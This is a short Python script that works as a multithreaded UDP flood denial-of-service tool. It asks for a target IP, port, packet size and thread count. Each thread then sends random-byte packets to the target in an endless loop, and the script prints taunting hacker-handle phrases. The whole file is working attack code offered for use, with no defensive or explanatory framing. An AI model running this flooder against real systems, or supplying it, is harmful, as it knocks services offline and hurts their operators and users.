

try:
    import threading
    import socket
    import random
    import sys
    

except ImportError as e:
    print(f"[ERROR] {e}")
    sys.exit()

def random_phrase():
    ppl = ["Near Shelby", "Sasaki", "sysb1n", "Gr3n0xX", "Quiliarca", "Lucazz Dev", "vl0ne-$", "Xernoboy", "marreta cabeça de rato", "S4SUK3"]
    phrase = ["was here", "is watching you", "knows your name", "knows your location", "hacked NASA", "hacked FBI", "hacked u", "is looking 4 u", "is right behind you", "has hype"]
    return random.choice(ppl) + " " + random.choice(phrase)


def banner():
    
    print(f"""
    """)

def DoS(ip, port, size, index):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        sock.sendto(random._urandom(size), (ip, port))
        print(f"THREAD {index} PACKET {size} Shooting!! {ip}")

def main():
    try:
        if sys.version_info[0] != 3:
            sys.exit()
        
        if len(sys.argv) < 5:
            banner()

        IP       = input("[>] IP : ") if len(sys.argv) < 2 else sys.argv[1]
        PORT     = int(input("[>] PORT : ")) if len(sys.argv) < 3 else int(sys.argv[2])
        SIZE     = int(input("[>] PACKET [35] : ")) if len(sys.argv) < 4 else int(sys.argv[3])
        COUNT    = int(input("[>] THREADS [10] : ")) if len(sys.argv) < 5 else int(sys.argv[4])


        if PORT > 65535 or PORT < 1:
            print("m[ERROR] Please, choose a port between 1 and 65535")
            sys.exit(1)

        if SIZE > 65500 or SIZE < 1:
            print("[ERROR] Please, choose a size between 1 and 65500")
            sys.exit(1)

    except KeyboardInterrupt:
        print("Exiting...")
        sys.exit()
    
    except Exception as e:
        print(f"[ERROR] {e}")
        sys.exit()

    for i in range(COUNT):
        try:
            t = threading.Thread(target=DoS, args=(IP, PORT, SIZE, i))
            t.start()
        except Exception as e:
            print(f"[ERROR] An error ocurred initializing thread {i}: {e}")            

if __name__ == "__main__":
    main()
    